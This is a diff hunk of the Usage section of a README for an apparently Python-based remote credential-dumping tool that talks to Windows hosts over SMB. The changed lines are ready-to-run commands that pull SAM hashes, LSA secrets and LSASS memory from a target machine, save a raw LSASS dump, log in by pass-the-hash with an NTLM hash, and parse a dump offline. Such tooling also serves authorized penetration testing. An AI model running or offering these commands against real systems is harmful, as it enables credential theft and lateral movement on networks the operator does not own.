@@ -95,20 +95,19 @@ Dependencies: `smbprotocol` + `pycryptodome` only.
 ## Usage
 
 ```bash
-# Full extraction (registry + LSASS)
-python main.py dump -t 192.168.1.50 -u admin -p 'P@ssw0rd'
+# Everything (SAM + LSA + LSASS) — default when no flags
+python main.py -t 10.0.0.5 -u admin -p 'P@ssw0rd'
 
-# Registry only (no LSASS, no PID lookup)
-python main.py dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -m registry
-
-# Save raw LSASS dump
-python main.py dump -t 192.168.1.50 -u admin -p pass -o lsass.dmp
+# Pick what you need
+python main.py -t 10.0.0.5 -u admin -p pass --sam
+python main.py -t 10.0.0.5 -u admin -p pass --sam --lsa
+python main.py -t 10.0.0.5 -u admin -p pass --lsass -o lsass.dmp
 
 # Pass-the-Hash
-python main.py dump -t 192.168.1.50 -u admin -H aad3b435b51404eeaad3b435b51404ee
+python main.py -t 10.0.0.5 -u admin -H aad3b435b51404eeaad3b435b51404ee --sam
 
 # Parse existing dump offline
-python main.py parse -f lsass.dmp
+python main.py --parse lsass.dmp
 ```
 
 ## Agent internals
